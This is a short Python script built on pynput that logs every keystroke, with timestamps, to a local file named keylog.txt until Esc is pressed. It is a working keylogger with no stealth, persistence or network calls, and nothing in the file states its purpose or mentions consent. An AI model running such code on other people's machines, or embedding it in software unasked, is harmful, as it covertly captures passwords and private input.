import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    """Log key press event"""
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    """Log key release event"""
    if key == keyboard.Key.esc:
        # Stop listener when Esc key is pressed
        return False

# Create a keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()